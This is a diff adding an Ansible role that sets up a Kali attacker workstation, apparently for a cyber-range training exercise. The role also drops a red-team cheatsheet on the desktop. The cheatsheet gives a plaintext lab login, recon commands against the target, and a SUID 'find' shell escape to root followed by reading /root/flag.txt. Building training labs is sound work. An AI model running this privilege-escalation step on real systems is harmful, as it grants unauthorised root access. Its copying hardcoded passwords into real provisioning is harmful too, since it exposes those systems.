@@ -1,0 +1,83 @@
+---
+# Kali attacker workstation.
+#
+# IMPORTANT: the `kali` base image already ships the full GUI/remote-desktop
+# stack and the KYPO console depends on it being left as-is:
+#   TCP 22    sshd      -> OpenSSH (baked in)
+#   TCP 5900  xvnc.socket / Xvnc  -> TigerVNC, Accept=yes, -query localhost
+#                                    (this is the port the KYPO GUI connects to)
+#   UDP 177   lightdm   -> XDMCP graphical login (baked in)
+#   UDP 323   chronyd   -> time sync (baked in)
+#   UDP 68/546 dhcpcd   -> DHCP client (baked in)
+#
+# Do NOT re-create or re-point xvnc.socket / xvnc@.service / lightdm here:
+# moving the VNC port off 5900 makes the platform GUI console hang forever.
+# This role only adds host aliases, pentest tooling and operator convenience.
+
+- name: Create alias for the target
+  lineinfile:
+    path: /etc/hosts
+    line: '10.1.31.10 target'
+
+- name: Install red-team / pentest tooling
+  apt:
+    update_cache: yes
+    pkg:
+      - nmap
+      - hydra
+      - gobuster
+      - dirb
+      - netcat-traditional
+      - sshpass
+      - curl
+      - jq
+      - net-tools
+    state: present
+
+- name: Ensure SSH is enabled and running
+  service:
+    name: ssh
+    enabled: yes
+    state: started
+
+- name: Create Desktop directory for Sandy
+  file:
+    path: /home/Sandy/Desktop
+    state: directory
+    owner: Sandy
+    group: Sandy
+    mode: '0755'
+
+- name: Drop a red-team cheatsheet on the Desktop
+  copy:
+    dest: /home/Sandy/Desktop/RedTeam-Cheatsheet.txt
+    owner: Sandy
+    group: Sandy
+    mode: '0644'
+    content: |
+      ==================================================
+        RED TEAM / PENTEST WORKSTATION - QUICK REFERENCE
+      ==================================================
+
+      THIS BOX (Kali attacker)
+        IP:        10.1.30.5
+        Login:     Sandy / sandypass
+        Remote:    GUI is served over the baked-in VNC on port 5900
+                   SSH -> ssh Sandy@10.1.30.5
+
+      TARGET
+        IP:        10.1.31.10   (alias: target)
+
+      RECON
+        nmap -sV 10.1.31.10
+        gobuster dir -u http://10.1.31.10 -w /usr/share/wordlists/dirb/common.txt
+        curl http://10.1.31.10/robots.txt
+
+      ACCESS
+        ssh operator@10.1.31.10
+
+      PRIVILEGE ESCALATION
+        find / -perm -4000 2>/dev/null        # list SUID binaries
+        # SUID find -> GTFOBins:
+        find . -exec /bin/sh -p \; -quit
+        cat /root/flag.txt
